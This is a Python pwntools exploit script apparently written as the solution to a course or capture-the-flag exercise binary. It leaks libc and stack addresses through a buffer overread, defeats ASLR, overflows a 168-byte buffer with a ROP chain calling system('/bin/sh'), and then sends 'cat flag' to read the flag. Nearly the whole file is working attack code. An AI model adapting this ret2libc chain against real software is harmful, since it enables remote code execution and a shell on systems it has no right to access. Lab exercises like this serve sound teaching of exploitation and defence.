#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4c'
#exe = './exercise4c'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
r = start()
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

r.recvline()
r.sendline(b'A'*120) #0x78
recv = r.recv()
setvbuf_addr = int.from_bytes(recv[4+120:4+120+6], "little") - 261 #setvbuf+261
offset = setvbuf_addr - libc.symbols['setvbuf']
libc.address = libc.address + offset

r.sendline(b'A'*160) #a0
recv = r.recv()
main_addr = int.from_bytes(recv[4+160:4+160+6], "little") - 8

rop = ROP(libc, main_addr)
ret = rop.ret[0]
pop_rdi_ret = rop.rdi[0]
bin_sh = next(libc.search(b"/bin/sh\x00"))
system_address = libc.symbols['system']
exit_address = libc.symbols['exit']
shellcode = b'A'*168 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_address) + p64(ret) + p64(exit_address)

r.sendline(shellcode)
r.sendline(b"cat flag")
r.sendline(b"exit")
print(r.recvall())